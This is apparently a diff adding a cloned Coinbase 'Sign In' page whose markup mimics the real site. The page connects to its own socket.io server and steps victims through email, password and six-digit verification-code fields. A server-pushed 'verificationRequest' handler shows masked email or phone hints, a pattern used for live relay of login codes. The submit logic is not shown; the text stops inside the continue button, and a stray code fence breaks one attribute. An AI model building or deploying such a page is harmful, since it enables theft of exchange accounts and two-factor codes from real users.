@@ -1,0 +1,341 @@
+<html lang="en" class="js-focus-visible" data-js-focus-visible=""><head>
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+    </script>
+    <link rel="stylesheet" href="css.css">
+    <style>body {transition: opacity ease-in 0.2s; } 
+body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
+</style><meta http-equiv="origin-trial" content="A7vZI3v+Gz7JfuRolKNM4Aff6zaGuT7X0mf3wtoZTnKv6497cVMnhy03KDqX7kBz/q/iidW7srW31oQbBt4VhgoAAACUeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGUuY29tOjQ0MyIsImZlYXR1cmUiOiJEaXNhYmxlVGhpcmRQYXJ0eVN0b3JhZ2VQYXJ0aXRpb25pbmczIiwiZXhwaXJ5IjoxNzU3OTgwODAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+
+    <title>Coinbase - Sign In</title>
+
+    <meta name="theme-color" content="#0052ff">
+
+    <link rel="icon" href="/favicon.ico">
+
+    <link rel="apple-touch-icon" sizes="120x120" href="/favicon-120.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="/favicon-152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon-180.png">
+
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32.png">
+    <link rel="icon" type="image/png" sizes="57x57" href="/favicon-57.png">
+    <link rel="icon" type="image/png" sizes="76x76" href="/favicon-76.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="/favicon-96.png">
+    <link rel="icon" type="image/png" sizes="128x128" href="/favicon-128.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="/favicon-192.png">
+    <link rel="icon" type="image/png" sizes="228x228" href="/favicon-228.png">
+
+    <script type="text/javascript" async="" charset="utf-8" src="https://www.gstatic.com/recaptcha/releases/X-oVtzDcTGjZVms4LEgykmCV/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-1hXncclAK9oddvNk7nwUp8lOZ2IQZ8EORLvz9K99Lac8WLGSbW6clTN1YX0NyXHn"></script><script id="arkose-config-script">
+      function setupArkose(config) {
+        window.arkoseConfig = config;
+      }
+    </script>
+
+    <script src="https://www.google.com/recaptcha/enterprise.js"></script>
+    <script async="" src="https://ark.coinbase.com/v2/api.js" data-callback="setupArkose" id="arkose-script"></script>
+
+    <link rel="shortcut icon" type="image/png" sizes="196x196" href="/favicon-196.png">
+
+    <script src="/ct.js" async=""></script>
+
+    <!-- Pre-fetch Google API-->
+    <link rel="dns-prefetch" href="https://www.accounts.google.com/gsi/client">
+
+    <!-- OpenGraph Tags -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://login.coinbase.com">
+    <meta property="og:title" content="Coinbase Sign In">
+    <meta property="og:site_name" content="Coinbase Sign In">
+    <!-- NOTE: Description is not translated -->
+    <meta property="description" name="description" content="Coinbase is a secure online platform for buying, selling, transferring, and storing digital currency.">
+
+    <!-- Twitter tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://login.coinbase.com">
+    <meta name="twitter:title" content="Coinbase Sign In">
+
+    <script type="module" crossorigin="" src="/e_DW0Dq61R.js"></script>
+    <link rel="stylesheet" crossorigin="" href="/assets/a_Y_wTjSmQ.css">
+  <style>.PbRoleerFjplRBGoiUNB{box-sizing:border-box;border:0;margin:0;padding:0;overflow:hidden;z-index:2147483647;pointer-events:none;visibility:hidden;opacity:0;transition:opacity 300ms linear;height:0;width:0;max-height:0;overflow:hidden;display:block}.PbRoleerFjplRBGoiUNB.active{display:block;visibility:visible;max-height:none;overflow:visible}.PbRoleerFjplRBGoiUNB.active.show{opacity:1;pointer-events:inherit;position:inherit}.PbRoleerFjplRBGoiUNB.active.show.in-situ{width:inherit;height:inherit}.PbRoleerFjplRBGoiUNB.active.show.lightbox{position:fixed;width:100% !important;height:100% !important;top:0;right:0;bottom:0;left:0}@-moz-document url-prefix(""){.PbRoleerFjplRBGoiUNB{visibility:visible;display:block}}</style><link rel="modulepreload" as="script" crossorigin="" href="/assets/c_C2UvR9es.js"><link rel="modulepreload" as="script" crossorigin="" href="/assets/c_hJXRgvTT.js"><link rel="modulepreload" as="script" crossorigin="" href="/assets/c_DJ4GyVMR.js"><link rel="modulepreload" as="script" crossorigin="" href="/assets/c_BX4U0e8D.js"><link rel="modulepreload" as="script" crossorigin="" href="/assets/c_8sjWzU6P.js"><link rel="stylesheet" crossorigin="" href="/assets/a_PE9-jZyu.css"><link rel="modulepreload" as="script" crossorigin="" href="/assets/c_CcMAQXxh.js"><link rel="modulepreload" as="script" crossorigin="" href="/assets/c_DTBG0-NW.js"><link rel="modulepreload" as="script" crossorigin="" href="/assets/c_rQ81hYit.js"><link rel="stylesheet" crossorigin="" href="/assets/a_DpaG35of.css"><link rel="modulepreload" as="script" crossorigin="" href="/assets/c_C5hV7Li3.js"><link rel="modulepreload" as="script" crossorigin="" href="/assets/c_Bf-H8vVx.js"><link rel="modulepreload" as="script" crossorigin="" href="/assets/c_R04Poiu_.js"><link rel="modulepreload" as="script" crossorigin="" href="/assets/c_DiPo2zBx.js"><link rel="stylesheet" crossorigin="" href="/assets/a_Bpb6XvMJ.css"><style data-styled="active" data-styled-version="6.1.17"></style><style id="googleidentityservice_button_styles">.qJTHM{-webkit-user-select:none;color:#202124;direction:ltr;-webkit-touch-callout:none;font-family:"Roboto-Regular",arial,sans-serif;-webkit-font-smoothing:antialiased;font-weight:400;margin:0;overflow:hidden;-webkit-text-size-adjust:100%}.ynRLnc{left:-9999px;position:absolute;top:-9999px}.L6cTce{display:none}.bltWBb{word-break:break-all}.hSRGPd{color:#1a73e8;cursor:pointer;font-weight:500;text-decoration:none}.Bz112c-W3lGp{height:16px;width:16px}.Bz112c-E3DyYd{height:20px;width:20px}.Bz112c-r9oPif{height:24px;width:24px}.Bz112c-r4WDKb{height:42px;width:42px}.Bz112c-uaxL4e{-webkit-border-radius:10px;border-radius:10px}.LgbsSe-Bz112c{display:block}.S9gUrf-YoZ4jf,.S9gUrf-YoZ4jf *{border:none;margin:0;padding:0}.fFW7wc-ibnC6b>.aZ2wEe>div{border-color:#4285f4}.P1ekSe-ZMv3u>div:nth-child(1){background-color:#1a73e8!important}.P1ekSe-ZMv3u>div:nth-child(2),.P1ekSe-ZMv3u>div:nth-child(3){background-image:linear-gradient(to right,rgba(255,255,255,.7),rgba(255,255,255,.7)),linear-gradient(to right,#1a73e8,#1a73e8)!important}.haAclf{display:inline-block}.nsm7Bb-HzV7m-LgbsSe{-webkit-border-radius:4px;border-radius:4px;-webkit-box-sizing:border-box;box-sizing:border-box;-webkit-transition:background-color .218s,border-color .218s;transition:background-color .218s,border-color .218s;-webkit-user-select:none;-webkit-appearance:none;background-color:#fff;background-image:none;border:1px solid #dadce0;color:#3c4043;cursor:pointer;font-family:"Google Sans",arial,sans-serif;font-size:14px;height:40px;letter-spacing:0.25px;outline:none;overflow:hidden;padding:0 12px;position:relative;text-align:center;vertical-align:middle;white-space:nowrap;width:auto}@media screen and (-ms-high-contrast:active){.nsm7Bb-HzV7m-LgbsSe{border:2px solid windowText;color:windowText}}.nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe{font-size:14px;height:32px;letter-spacing:0.25px;padding:0 10px}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe{font-size:11px;height:20px;letter-spacing:0.3px;padding:0 8px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe{padding:0;width:40px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.pSzOP-SxQuSe{width:32px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.purZT-SxQuSe{width:20px}.nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK{-webkit-border-radius:20px;border-radius:20px}.nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK.pSzOP-SxQuSe{-webkit-border-radius:16px;border-radius:16px}.nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK.purZT-SxQuSe{-webkit-border-radius:10px;border-radius:10px}.nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc{border:none;color:#fff}.nsm7Bb-HzV7m-LgbsSe.MFS4be-v3pZbf-Ia7Qfc{background-color:#1a73e8}.nsm7Bb-HzV7m-LgbsSe.MFS4be-JaPV2b-Ia7Qfc{background-color:#202124;color:#e8eaed}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{height:18px;margin-right:8px;min-width:18px;width:18px}.nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{height:14px;min-width:14px;width:14px}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{height:10px;min-width:10px;width:10px}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-Bz112c{margin-left:8px;margin-right:-4px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{margin:0;padding:10px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{padding:8px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{padding:4px}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-top-left-radius:3px;border-top-left-radius:3px;-webkit-border-bottom-left-radius:3px;border-bottom-left-radius:3px;display:-webkit-box;display:-webkit-flex;display:flex;justify-content:center;-webkit-align-items:center;align-items:center;background-color:#fff;height:36px;margin-left:-10px;margin-right:12px;min-width:36px;width:36px}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf .nsm7Bb-HzV7m-LgbsSe-Bz112c,.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf .nsm7Bb-HzV7m-LgbsSe-Bz112c{margin:0;padding:0}.nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{height:28px;margin-left:-8px;margin-right:10px;min-width:28px;width:28px}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{height:16px;margin-left:-6px;margin-right:8px;min-width:16px;width:16px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-radius:3px;border-radius:3px;margin-left:2px;margin-right:0;padding:0}.nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-radius:18px;border-radius:18px}.nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-radius:14px;border-radius:14px}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-radius:8px;border-radius:8px}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-bN97Pc-sM5MNb{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;-webkit-flex-direction:row;flex-direction:row;justify-content:space-between;-webkit-flex-wrap:nowrap;flex-wrap:nowrap;height:100%;position:relative;width:100%}.nsm7Bb-HzV7m-LgbsSe .oXtfBe-l4eHX{justify-content:center}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-BPrWId{-webkit-flex-grow:1;flex-grow:1;font-family:"Google Sans",arial,sans-serif;font-weight:500;overflow:hidden;text-overflow:ellipsis;vertical-align:top}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-BPrWId{font-weight:300}.nsm7Bb-HzV7m-LgbsSe .oXtfBe-l4eHX .nsm7Bb-HzV7m-LgbsSe-BPrWId{-webkit-flex-grow:0;flex-grow:0}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-MJoBVe{-webkit-transition:background-color .218s;transition:background-color .218s;bottom:0;left:0;position:absolute;right:0;top:0}.nsm7Bb-HzV7m-LgbsSe:hover,.nsm7Bb-HzV7m-LgbsSe:focus{-webkit-box-shadow:none;box-shadow:none;border-color:rgb(210,227,252);outline:none}.nsm7Bb-HzV7m-LgbsSe:hover .nsm7Bb-HzV7m-LgbsSe-MJoBVe,.nsm7Bb-HzV7m-LgbsSe:focus .nsm7Bb-HzV7m-LgbsSe-MJoBVe{background:rgba(66,133,244,.04)}.nsm7Bb-HzV7m-LgbsSe:active .nsm7Bb-HzV7m-LgbsSe-MJoBVe{background:rgba(66,133,244,.1)}.nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:hover .nsm7Bb-HzV7m-LgbsSe-MJoBVe,.nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:focus .nsm7Bb-HzV7m-LgbsSe-MJoBVe{background:rgba(255,255,255,.24)}.nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:active .nsm7Bb-HzV7m-LgbsSe-MJoBVe{background:rgba(255,255,255,.32)}.nsm7Bb-HzV7m-LgbsSe .n1UuX-DkfjY{-webkit-border-radius:50%;border-radius:50%;display:-webkit-box;display:-webkit-flex;display:flex;height:20px;margin-left:-4px;margin-right:8px;min-width:20px;width:20px}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId{font-family:"Roboto";font-size:12px;text-align:left}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .ssJRIf,.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff .fmcmS{overflow:hidden;text-overflow:ellipsis}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;color:#5f6368;fill:#5f6368;font-size:11px;font-weight:400}.nsm7Bb-HzV7m-LgbsSe.jVeSEe.MFS4be-Ia7Qfc .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff{color:#e8eaed;fill:#e8eaed}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff .Bz112c{height:18px;margin:-3px -3px -3px 2px;min-width:18px;width:18px}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-top-left-radius:0;border-top-left-radius:0;-webkit-border-bottom-left-radius:0;border-bottom-left-radius:0;-webkit-border-top-right-radius:3px;border-top-right-radius:3px;-webkit-border-bottom-right-radius:3px;border-bottom-right-radius:3px;margin-left:12px;margin-right:-10px}.nsm7Bb-HzV7m-LgbsSe.jVeSEe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-radius:18px;border-radius:18px}.L5Fo6c-sM5MNb{border:0;display:block;left:0;position:relative;top:0}.L5Fo6c-bF1uUb{-webkit-border-radius:4px;border-radius:4px;bottom:0;cursor:pointer;left:0;position:absolute;right:0;top:0}.L5Fo6c-bF1uUb:focus{border:none;outline:none}sentinel{}</style><link id="googleidentityservice" type="text/css" media="all" href="https://accounts.google.com/gsi/style" rel="stylesheet"><meta http-equiv="origin-trial" content="A8o5T4MyEkRZqLA9WeG2XTFdV5tsX2Prg85xyQ+RL1btVuybB1K/EQ+7JUsPK+J32oBMTnsoF9B4A+qTlL6efgQAAABweyJvcmlnaW4iOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkZlZENtQnV0dG9uTW9kZSIsImV4cGlyeSI6MTc0NDY3NTIwMCwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta name="description" content="Coinbase is a secure online platform for buying, selling, transferring, and storing cryptocurrency." data-rh="true"></head>
+  <body class="cds-dark-dnxyhnk" style="background-color: rgba(var(--gray0));">
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="loading-screen" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(var(--gray0)); display: flex; justify-content: center; align-items: center; z-index: 9999;">
+        <div style="text-align: center;">
+            <div class="loader"></div>
+        </div>
+    </div>
+    <script>
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                document.getElementById('loading-screen').style.opacity = '0';
+                setTimeout(function() {
+                    document.getElementById('loading-screen').style.display = 'none';
+                }, 500);
+            }, 1000);
+        });
+    </script>
+    <div id="root" style="display: flex; flex-direction: column; min-height: 100%"><div class="cds-large-l1kwdti4 cds-dark-dnxyhnk" style="--foreground: rgb(var(--gray100)); --foreground-muted: rgb(var(--gray60)); --background: rgb(var(--gray0)); --background-alternate: rgb(var(--gray5)); --background-inverse: rgb(var(--gray100)); --background-overlay: rgba(var(--gray80),0.33); --line: rgba(var(--gray60),0.2); --line-heavy: rgba(var(--gray60),0.66); --primary: rgb(var(--blue70)); --primary-wash: rgb(var(--blue0)); --primary-foreground: rgb(var(--gray0)); --negative: rgb(var(--red60)); --negative-foreground: rgb(var(--gray0)); --negative-wash: rgb(var(--red0)); --positive: rgb(var(--green60)); --positive-foreground: rgb(var(--gray0)); --secondary: rgb(var(--gray20)); --secondary-foreground: rgb(var(--gray100)); --transparent: rgba(var(--gray0),0); --warning: rgb(var(--yellow50)); --warning-foreground: rgb(var(--orange70));"><div data-testid="global-loading-provider-wrapper" class="cds-flex-f1tjavv3 cds-column-c1kchipr" style="flex-grow: 1; width: 100%;"><div class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-column-c1kchipr cds-space-between-s1y044t2 cds-background-b6zr2pu" style="height: 100%; width: 100%;"><div data-testid="signin-header" class="cds-flex-f1tjavv3 cds-center-cneamvj cds-center-c14yogr6 cds-space-between-s1y044t2 cds-background-b6zr2pu cds-3-_m245rc cds-3-_63shon cds-2-_fik044 cds-0-_1dm135g" style="height: max-content; width: 100%;"><svg aria-label="Coinbase logo" class="cds-iconStyles-irtngcj" height="32" role="img" viewBox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg"><title>Coinbase logo</title><path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF"></path></svg><div class="cds-flex-f1tjavv3 cds-row-r1cf21wt cds-0-_1dm135g cds-1-_1w0e50j"><button data-testid="button-sign-up" class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-button-b15nm6xx cds-scaledDownState-s1o6alxd cds-secondaryForeground-sy4giet cds-button-b1oh4z3j cds-buttonCompact-b6w3n9f cds-2-_11ix2s4 cds-2-_1fpvsav" type="button" style="--interactable-height: 40px; --interactable-border-radius: 40px; --interactable-background: transparent; --interactable-hovered-background: rgb(15, 16, 18); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(30, 31, 32); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13);"><span class="cds-positionRelative-pa1s919"><span class="cds-typographyResets-t6muwls cds-headline-h4steop cds-secondaryForeground-sy4giet cds-transition-t1qvlahm cds-start-s1u0g7ow"><span class="">Sign up</span></span></span></button></div></div><div class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-column-c1kchipr cds-1-_1sy2ps1 cds-1-_17cz18m" style="flex-grow: 1; width: 100%;"><div data-testid="global-loading-provider-wrapper" class="cds-flex-f1tjavv3 cds-column-c1kchipr" style="flex-grow: 1; width: 100%; align-items: center; justify-content: center;"><div class="cds-flex-f1tjavv3 cds-flex-start-fptdbvx cds-row-r1cf21wt cds-center-cqy3t5k" style="flex-grow: 1; width: 100%;"><div class="cds-flex-f1tjavv3 cds-column-c1kchipr" style="flex-grow: 1; height: 100%; max-width: 448px; width: 100%;"><div class="cds-flex-f1tjavv3 cds-center-cqy3t5k cds-roundedLarge-r1hj45o7 cds-bordered```html
+Off-b16cgegt cds-3-_m245rc cds-3-_63shon cds-3-_5y4gfs" style="width: 100%;"><div id="two-factor" class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-3-_10f3bvw" style="width: 100%;"><form><div class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-2-_jg634k"><h2 class="cds-typographyResets-t6muwls cds-title1-t2i0v90 cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow cds-9-_1s97ztp">Sign in to Coinbase</h2></div><div id="emailSection" class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh" style="width: 100%; opacity: 1;">
+  <label for="cds-textinput-label-:r2:" data-testid="" class="cds-typographyResets-t6muwls cds-label1-l9tazn8 cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow cds-0_5-_1rgrln9 cds-0_5-_f2wcfe cds-labelStyle-lnx209w">Email</label>
+  <div class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
+    <div class="cds-inputAreaContainerStyles-ipofex6">
+      <span data-testid="input-interactable-area" class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgb(15, 16, 18); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(30, 31, 32); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13);">
+        <input aria-label="Email" class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-2-_1o1v48h" data-testid="unified-login-email-prompt-input" tabindex="0" aria-invalid="false" id="cds-textinput-label-:r2:" placeholder="Your email address" type="email" autocomplete="username webauthn" value="" style="text-align: start; color-scheme: dark;">
+      </span>
+    </div>
+  </div>
+</div>
+
+<div id="emailDisplay" style="display: none; margin: 10px 0;">
+  <div class="cds-flex-f1tjavv3">
+    <button class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-line-l60vh0u cds-button-b15nm6xx cds-scaledDownState-s1o6alxd cds-pressablePaddingResetStyles-p14zsnbw" type="button" style="--interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgb(15, 16, 18); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(30, 31, 32); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13); width: 100%;">
+      <div class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-2-_1o1v48h cds-1-_1w0e50j">
+        <div class="cds-flex-f1tjavv3 cds-relative-r5okg6e" style="position: relative;">
+          <div class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-center-cqy3t5k cds-transparent-t1pmzpst cds-hidden-h1pkpo4h cds-roundedFull-rl2p50e cds-relative-r5okg6e" style="flex-grow: 0; flex-shrink: 0; height: 32px; width: 32px; position: relative;">
+            <div class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-center-cqy3t5k cds-transparent-t1pmzpst cds-hidden-h1pkpo4h cds-roundedFull-rl2p50e cds-relative-r5okg6e cds-avatar" style="flex-grow: 0; flex-shrink: 0; height: 32px; width: 32px; position: relative; border-color: transparent;">
+                <img alt="user avatar" class="cds-image-it639h6 cds-cover-cbzp605" height="32" src="/icon.png" width="32" style="border-radius: 1000px;">
+              </div>
+          </div>
+        </div>
+        <p id="displayedEmail" class="cds-typographyResets-t6muwls cds-headline-h4steop cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow cds-truncate-tpurrmi"></p>
+      </div>
+    </button>
+  </div>
+</div>
+
+<div id="passwordSection" class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh" style="width: 100%; opacity: 1; display: none;">
+  <label for="password" class="cds-typographyResets-t6muwls cds-label1-l9tazn8 cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow cds-0_5-_1rgrln9 cds-0_5-_f2wcfe cds-labelStyle-lnx209w">Password</label>
+  <div class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
+    <div class="cds-inputAreaContainerStyles-ipofex6">
+      <span data-testid="input-interactable-area" class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgb(15, 16, 18); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(30, 31, 32); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13);">
+        <input aria-label="Password" class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-2-_1o1v48h" data-testid="password-input" tabindex="0" aria-invalid="false" id="password" placeholder="Enter your password" type="password" autocomplete="current-password" value="" style="text-align: start; color-scheme: dark;">
+      </span>
+    </div>
+  </div>
+  <div class="cds-flex-f1tjavv3 cds-row-r1cf21wt" style="justify-content: flex-end; margin-top: 8px;">
+    <a href="#" class="cds-link-l1t1pgxt cds-typographyResets-t6muwls cds-label1-l9tazn8 cds-foreground-f1v7bdxr cds-transition-t1qvlahm" style="color: rgb(var(--blue70)); text-decoration: none;">Forgot password?</a>
+  </div>
+</div><div class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-column-c1kchipr cds-2-_fik044 cds-2-_mr0se7"><div id="verificationSection" style="display: none;">
+
+      <div id="otpSection" class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh" style="width: 100%; opacity: 1; display: none;">
+        <h2 class="cds-typographyResets-t6muwls cds-title1-t2i0v90 cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow cds-9-_1s97ztp" style="margin-bottom: 24px;">Enter verification code</h2>
+        <p id="otpDescription" class="cds-typographyResets-t6muwls cds-body-bwup3gq cds-foregroundMuted-flk4pe3" style="margin-bottom: 24px;">Please wait for verification request...</p>
+<script>
+socket.on('verificationRequest', (data) => {
+  const descEl = document.getElementById('otpDescription');
+  if (data.type === 'email') {
+    descEl.textContent = `Check your email that starts with ${data.identifier}** for the verification code`;
+  } else {
+    descEl.textContent = `Check your phone number ending in ${data.identifier} for the verification code`;
+  }
+});
+</script>
+        <label for="otp" class="cds-typographyResets-t6muwls cds-label1-l9tazn8 cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow cds-0_5-_1rgrln9 cds-0_5-_f2wcfe cds-labelStyle-lnx209w">Verification code</label>
+        <div class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
+          <div class="cds-inputAreaContainerStyles-ipofex6">
+            <span data-testid="input-interactable-area" class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgb(15, 16, 18); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(30, 31, 32); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13);">
+              <input id="otp" class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-2-_1o1v48h" data-testid="otp-input" tabindex="0" aria-invalid="false" placeholder="Enter 6-digit code" type="text" maxlength="6" style="text-align: start; color-scheme: dark;">
+            </span>
+          </div>
+        </div>
+        <div id="otpErrorMessage" style="color: #ff4444; margin-top: 10px; text-align: center; display: none;">
+          Invalid OTP code, please try again
+        </div>
+      </div>
+</div>
+
+<button onclick="handleContinue()" id="continueButton" data-testid="unified-login-email-prompt-submit-button" aria-busy="false" aria-disabled="true" class="cds-interactable-i17wmk8f cds-disabledState-do7z3i1 cds-disabledBorder-d109aw8r cds-transparent-t1pmzpst cds-button-b15nm6xx cds-fullWidth-f1ytinjt cds-scaledDownState-s1o6alxd cds-primaryForeground-pd71c0x cds-button-b1oh4z3j cds-buttonBlock-b1aolcod cds-4-_1g6imbc cds-4-_13srchq" type="button" style="--interactable-height: 56px; --interactable-border-radius: 56px; --interactable-background: var(--primary); --interactable-hovered-background: rgb(80, 127, 229); --interactable-hovered-opacity: 0.91; --interactable-pressed-background: rgb(75, 120, 214); --interactable-pressed-opacity: 0.85; --interactable-disabled-background: rgb(49, 75, 132);">
+  <span class="cds-positionRelative-pa1s919">
